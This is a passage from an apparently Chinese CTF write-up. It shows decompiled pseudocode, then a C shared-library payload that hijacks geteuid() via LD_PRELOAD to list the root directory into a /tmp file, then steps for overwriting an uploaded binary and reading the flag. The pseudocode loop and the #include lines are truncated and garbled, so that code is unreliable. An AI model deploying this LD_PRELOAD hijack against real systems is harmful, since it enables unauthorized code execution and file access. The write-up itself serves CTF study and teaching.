    {
    v9 = b1/59865.9000000000010;
    v10 = v9 +21;
    v12 = v10;
    v31[1]= v12;
    b13=v12;
    b15 = b13 *2.4230000000000;
    v16 = b15 +1.7;
    v17 = v16;
    v31[2]= v17;
    if ( v17 > 0x6F )
    {
    v18 = b1 /24867.4000000000010;
    v31[3]= v18;
    }else{
    returnresult;
    }
    v31[13]=51;
    v31[14]=116;
    v31[15]=101;
    v31[16]=55;
    }
    else
    {
    returnresult;
    v31[1]=57;
    v31[2]=67;
    v31[3]=-120;
    v31[13]=61;
    v31[14]=106;
    v31[15]=111;
    v31[16]=59;
    }
    v31[4]=v31[2]-4;
    v19 = b1 /31693.7999999999990;
    v31[5]= (v19);
    v20= b1/19242.6600000000000;
    v31[6]=(v20);
    v21= (b1/15394.1000000000000);
    v31[7]= (v21);
    v22= (b1/14829.2000000000010);
    v31[8]=(v22);
    v23= (b1/16003.7999999999990);
    v31[9]= (v23);
    v24= (b1/14178.7999999999990);
    v31[10]= (v24);
    v31[11]=v29/20992;
    v25= (b1 /16663.7000000000010);
    v26=(v25);
    v31[17]=0;
    v31[12]=v26;
    for(int i=0;i='a' && v31[i]='A' && v31[i]='0' && v31[i]
    #include 
    #include 
    #include 
    void payload()
    {
        DIR* dir;
        struct dirent* ptr;
        dir = opendir("/");
        FILE  *fp;
        fp=fopen("/tmp/venenoveneno","w");
        while ((ptr = readdir(dir)) != NULL) {
            fprintf(fp,"%sn",ptr->d_name);
        }
        closedir(dir);
        fflush(fp);
    }
    int geteuid()
    {
        if (getenv("LD_PRELOAD") == NULL) {
            return 0;
        }
        unsetenv("LD_PRELOAD");
        payload();
    }
然后gcc编译成so,然后根据前面的点,我们明白了出题人的思路:
做到这里,还有题目最后一个坑,就是生成的东西没权限去读,那么怎么办,于是前面传的shell用了用处,我们可以利用copy命令,去覆盖一个我们之前上传的bin,于是直接列目录:
然后再利用loadfile读就可以了:
发现flag,然后再进行一次类似操作,利用fopen去读文件,最后成功得到flag: